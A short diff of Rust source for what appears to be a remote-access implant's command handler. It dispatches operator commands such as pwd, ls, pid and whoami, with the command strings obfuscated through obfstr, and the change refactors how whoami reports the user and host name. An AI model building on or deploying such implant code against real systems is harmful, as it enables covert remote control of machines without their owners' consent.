@@ -115,7 +115,7 @@ fn link_command(command: String) -> String {
         a if (a == obfstr::obfstr!("pwd")) => pwd(),
         a if (a == obfstr::obfstr!("ls")) => ls(args),
         a if (a == obfstr::obfstr!("pid")) => pid().to_string(),
-        a if (a == obfstr::obfstr!("whoami")) => String::from(format!("{}\\{}", hostname(), username())),
+        a if (a == obfstr::obfstr!("whoami")) => String::from(format!("{}@{}", whoami::username(), whoami::hostname())),
         a if (a == obfstr::obfstr!("exit")) => return "exit".to_string(),
         _ => String::from(format!("not a command")),
     }
@@ -179,20 +179,6 @@ fn cd(args: Vec<&str>) -> String {
         }
     } else {
         return String::from("")
-    }
-}
-
-fn username() -> String {
-    match std::env::var("USERNAME") {
-        Ok(val) => val,
-        Err(_) => "error".to_string(),
-    }
-}
-
-fn hostname() -> String {
-    match std::env::var("HOSTNAME") {
-        Ok(val) => val,
-        Err(_) => "error".to_string(),
     }
 }
 
